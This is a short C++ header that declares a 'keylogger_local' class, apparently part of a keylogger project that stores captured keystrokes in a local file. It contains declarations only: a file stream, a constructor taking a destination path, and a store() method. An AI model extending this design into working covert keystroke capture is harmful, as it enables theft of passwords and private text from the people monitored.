#ifndef _KEYLOGGER_LOCAL_HPP_
#define _KEYLOGGER_LOCAL_HPP_

#include "../keylogger.hpp"

class keylogger_local : virtual public keylogger
{
	private:
		ofstream m_ofstream;

	public:
		keylogger_local(string p_destination_path);

		virtual ~keylogger_local();

		virtual void store();
};

#endif
